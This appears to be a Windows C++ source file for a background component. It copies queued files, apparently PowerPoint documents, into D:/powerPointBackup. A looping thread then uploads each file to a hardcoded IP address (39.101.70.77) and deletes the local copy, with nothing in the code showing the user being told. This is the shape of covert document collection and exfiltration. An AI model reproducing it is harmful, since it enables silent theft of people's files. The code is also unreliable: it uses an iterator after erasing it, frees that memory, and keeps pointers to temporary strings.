//
// Created by 谪尘 on 2023-04-24.
//

#include <iostream>
#include "objToUpLoadOrSave.h"
#include "openssl/md5.h"
#include <fstream>
#include "Shlwapi.h"
#include <sstream>
#include <iomanip>
#include <curl/curl.h>
#include <processthreadsapi.h>
#include <filesystem>
#include "tools.h"
#pragma  comment(lib,"shlwapi.lib")
using namespace std;
namespace fs = std::filesystem;
void objToUpLoadOrSave::toAddTask(const char *filePath) {
    string sign = Tools::calcFileSign(filePath);
    if(taskMap.count(sign)){
       return;
    }
    EnterCriticalSection(&_mapLocke);
    taskMap[sign] = filePath;
    LeaveCriticalSection(&_mapLocke);
    //触发事件处理
    SetEvent(_eventEvent);
    return  ;
}
DWORD WINAPI  objToUpLoadOrSave::toUpLoad( LPVOID lpParam ) {
    while (TRUE){
        objToUpLoadOrSave* _this = (objToUpLoadOrSave*)lpParam;
        auto pair = _this->taskMap.begin();
        map<string, int> tryCounts;
        while ( pair != _this->taskMap.end()) {  
            LPCSTR lpNewDirectory = "D:/powerPointBackup";  // 目标文件夹路径

            // 检查目录是否存在，如果不存在则创建目录
            BOOL result = PathFileExists(lpNewDirectory);
            if (result == FALSE)
            {
                cout << "dir is not be exist!"<<endl;
                result = CreateDirectory(lpNewDirectory, NULL);
                if (result == FALSE)
                {
                    // 创建目录失败，下个任务
                    DWORD errorCode = GetLastError();
                    cout << "create Directory Failed! ErrCode: " << errorCode  << endl;
                    EnterCriticalSection(&(_this->_mapLocke));
                    pair = _this->taskMap.erase(pair);
                    LeaveCriticalSection(&(_this->_mapLocke));
                    continue;
                }
            }
        cout << "dir was exist!"<<endl;

        printf("start openfile path : %s\n",(*pair).second);
           HANDLE fileHandle = CreateFile(
                    (*pair).second,                  // 文件路径
                    GENERIC_READ,              // 访问模式：读取
                    FILE_SHARE_READ,           // 共享模式：允许其他程序只读访问
                    NULL,                      // 安全属性：默认值（NULL）
                    OPEN_EXISTING,             // 打开方式：只打开已存在的文件
                    FILE_ATTRIBUTE_NORMAL,     // 文件属性：默认值
                    NULL                       // 模板句柄：没有模板
            );
            if (fileHandle == INVALID_HANDLE_VALUE) {
                cout << "open old file failed!" <<endl;
                cout << "errcode" << GetLastError() << endl;
                EnterCriticalSection(&(_this->_mapLocke));
                pair = _this->taskMap.erase(pair);
                LeaveCriticalSection(&(_this->_mapLocke));
                continue;
            }
            string destC = (*pair).second;
            size_t pos =  destC.find_last_of("/");
            string fileName = (pos == std::string::npos) ? destC : destC.substr(pos + 1);
            fileName = "D:/powerPointBackup/"+fileName;
            const char * cstrp = fileName.c_str();
            HANDLE descHandle = CreateFile(
                cstrp,                  // 文件路径
                    GENERIC_READ | GENERIC_WRITE,              // 访问模式：读取
                    0,           // 共享模式：允许其他程序只读访问
                    NULL,                      // 安全属性：默认值（NULL）
                    CREATE_ALWAYS,             // 打开方式：只打开已存在的文件
                    FILE_ATTRIBUTE_NORMAL,     // 文件属性：默认值
                    NULL                       // 模板句柄：没有模板
            );
            if (descHandle == INVALID_HANDLE_VALUE) {
                cout << " open new file failed!" <<endl;
                cout <<  "errcode" << GetLastError() << endl;
                CloseHandle(fileHandle);
                EnterCriticalSection(&(_this->_mapLocke));
                pair = _this->taskMap.erase(pair);
                LeaveCriticalSection(&(_this->_mapLocke));
                continue;
            }
            DWORD bytesRead = 0;
            DWORD bytesWritten;
            const int bufSize = 1024;
            unsigned char buf[bufSize];
            while (ReadFile(fileHandle, buf, bufSize, &bytesRead, nullptr)) {
                if (bytesRead == 0)
                    break;
                if(!WriteFile(descHandle, buf, bytesRead, &bytesWritten, NULL)){
                    cout<<"copy failed!" << endl;
                    break;
                }
            }
            CloseHandle(descHandle);
            CloseHandle(fileHandle);
            EnterCriticalSection(&(_this->_mapLocke));
                pair = _this->taskMap.erase(pair);
            LeaveCriticalSection(&(_this->_mapLocke));
            //存放路径的内存空间也需要释放
            free((void*)((*pair).second));
        }
        cout << "wait task..." << endl;;
        WaitForSingleObjectEx(_this->_eventEvent,INFINITE,TRUE);
    }
}
DWORD WINAPI objToUpLoadOrSave::TrackEverything(LPVOID lpParam) {
    objToUpLoadOrSave* _this = (objToUpLoadOrSave*)lpParam;
    std::string path = "D:\\powerPointBackup";  
    fs::path myPath(path);
    CURL* curl;
    CURLcode res;
    while (1)
    {
        try
        {
            if (!fs::exists(myPath))
            {
                std::cout << "Path not exists." << std::endl;
                Sleep(5000);
                continue;
            }
            cout << "try upload file!" << endl;
            curl = curl_easy_init();
            struct curl_slist* headers = NULL;
            int http_response_code;
            for (const auto& entry : fs::directory_iterator(path)) {
                const char* filePath = entry.path().string().c_str();
                string tmp = filePath;
                string md5 = Tools::calcFileSign(filePath);
                if (md5.size() < 32) {
                    cout << "Failed to calc sign.ignore the file!" << endl;
                    continue;
                }
                std::string jsonData = "{\"sign\":\"" + md5 + "\"}";
                curl_easy_setopt(curl, CURLOPT_URL, _this->AskUrl.c_str());
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
                res = curl_easy_perform(curl);
                if (res == CURLE_OK) {
                    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
                    if (http_response_code != 200) {
                        goto A;
                    }
                    curl_easy_reset(curl);
                    curl_easy_setopt(curl, CURLOPT_ENCODING, "UTF-8");
                    struct curl_httppost* post = nullptr;
                    struct curl_httppost* last = nullptr;
                    headers = curl_slist_append(NULL, "Content-Type: multipart/form-data");
                    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                    curl_easy_setopt(curl, CURLOPT_URL, _this->upLoadUrl.c_str());
                    std::string strName = Tools::ANSItoUTF8(tmp.c_str());
                    cout << strName << endl;
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILENAME, "file", CURLFORM_FILE, strName.c_str(), CURLFORM_END);
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "sign", CURLFORM_PTRCONTENTS, md5.c_str(), CURLFORM_END);
                    curl_formadd(&post, &last, CURLFORM_COPYNAME, "fileName", CURLFORM_PTRCONTENTS, strName.c_str(), CURLFORM_END);
                    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
                    res = curl_easy_perform(curl);
                    curl_formfree(post);
                    if (res == CURLE_OK) {
                        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_response_code);
                        if (http_response_code != 200) {
                            continue;
                        }
                    }
                    else {

                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                        continue;
                    }
                }
                else {
                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
                    continue;
                }
            A:
                std::remove(tmp.c_str());
            }
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
        }
        catch (const std::exception& error)
        {
            cout << "an error happend:" << error.what() << endl;;
        }
        Sleep(5000);
    }
    return 0;
}
objToUpLoadOrSave::objToUpLoadOrSave(){
    InitializeCriticalSection(&_mapLocke);
    DWORD dwThreadId;
    upLoadUrl  = "http://39.101.70.77/api/upload";
    AskUrl = "http://39.101.70.77/api/ask";
    _eventEvent = CreateEvent(NULL, FALSE,FALSE, NULL);
    auto dwThrdParam = (LPVOID)this;
    _eventsThread = CreateThread(
            NULL,                        
            0,                          
            objToUpLoadOrSave::toUpLoad,     
            dwThrdParam,               
            0,                          
            &dwThreadId);    
    _upLoadThread = CreateThread(
        NULL,
        0,
        objToUpLoadOrSave::TrackEverything,
        dwThrdParam,
        0,
        &dwThreadId);
    if (_eventsThread == NULL)
    {
        throw "error";
    }
}
